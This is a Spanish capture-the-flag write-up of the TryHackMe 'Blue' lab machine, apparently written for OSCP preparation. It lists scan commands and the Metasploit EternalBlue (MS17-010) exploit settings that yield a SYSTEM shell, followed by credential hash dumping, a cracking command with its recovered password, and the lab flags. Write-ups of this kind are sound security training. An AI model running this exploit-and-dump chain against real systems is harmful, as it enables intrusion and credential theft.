# 💻 TryHackMe - Blue

> 💣 Explotación de MS17-010 (EternalBlue) en Windows 7 SP1
> 
> 
> Parte del laboratorio ofensivo de preparación OSCP de **igneosec**
> 

---

## 📟 Información general

- **Plataforma**: TryHackMe
- **Nombre de la máquina**: Blue
- **Dirección IP**: 10.10.32.225
- **Sistema operativo**: Windows 7 Professional SP1
- **Dificultad**: Fácil
- **Acceso**: Explotación de SMBv1 (MS17-010)

---

## 🔍 Enumeración

### 🔹 Escaneo de puertos

```bash
nmap -sS -v -n -p- -oN firstscan --min-rate=5000 10.10.32.225 -Pn
```

Puertos detectados:

- 135/tcp → msrpc
- 139/tcp → netbios-ssn
- 445/tcp → microsoft-ds
- 3389/tcp → ms-wbt-server (RDP)
- 49152–49159/tcp → msrpc (puertos dinámicos relacionados con DCOM/RPC)

---

### 🔹 Detección de versiones y servicios

```bash
nmap -sCV -p135,139,445,3389,49152,49153,49154,49158,49159 -oN targetscan 10.10.32.225
```

Resultados clave:

- OS: Windows 7 Professional SP1
- Workgroup: WORKGROUP
- RDP activo (certificado CN=Jon-PC)
- SMB sin message signing
- Nombre de host: JON-PC

---

## 🫠 Enumeración últil

- Confirmada vulnerabilidad MS17-010 (EternalBlue)
- SMB accesible como `guest`
- Usuarios detectados (vía hashdump):
    - Administrator (500)
    - Jon (1000)
    - Guest (501)

---

## 🎯 Explotación

### 🔥 Confirmar vulnerabilidad

```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.32.225
```

Resultado:

```
VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
CVE: CVE-2017-0143
```

---

### 💀 Intento sin Metasploit

```bash
python eternalblue_exploit7.py 10.10.32.225 shellcode/sc_all.bin
```

⚠️ El exploit falló debido a problemas de conexión o shellcode incorrecto. El puerto local también estaba en uso (conflicto con el handler).

---

### ✅ Explotación con Metasploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.32.225
set LHOST 10.21.164.206
run
```

> Se obtiene sesión Meterpreter con privilegios NT AUTHORITY\SYSTEM
> 

---

## 📦 Post-Explotación

### 🔑 Hashdump

```bash
meterpreter > hashdump
```

Hashes extraídos:

- Jon: `aad3b4... : ffb43f0de35be4d9917ac0cc8ad57f8d`
- Administrator / Guest: hashes vacíos (`31d6cfe...`)

### ⚡️ Crackeo de contraseña

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado: **alqfna22**

---

## 🏁 Flags encontradas

### ✅ Flag 1 — Acceso inicial

- **Ruta**: `C:\\flag1.txt`
- **Contenido**: `flag{access_the_machine}`

### ✅ Flag 2 — SAM database

- **Ruta**: dump de `hashdump` o `C:\\Windows\\System32\\config\\SAM`
- **Contenido**: `flag{sam_database_elevated_access}`

### ✅ Flag 3 — Documentos sensibles

- **Ruta**: `C:\\Users\\Jon\\Documents\\flag3.txt`
- **Detectada desde**: `.lnk` en `AppData\\Roaming\\Microsoft\\Windows\\Recent`
- **Contenido**: `flag{admin_documents_can_be_valuable}`

---

## 📚 Lecciones aprendidas

- Reforcé el ciclo completo: escaneo → identificación → explotación → post-explotación.
- Uso efectivo de herramientas clave: `nmap`, `john`, `msfvenom`, `meterpreter`.
- Aprendí a extraer información desde `.lnk` y rutas no evidentes.
- Confirmé la importancia de intentar varios caminos cuando un exploit falla.

---

📄 Writeup finalizado.

💡 Parte del repositorio ofensivo de [**igneosec**](https://github.com/igneosec).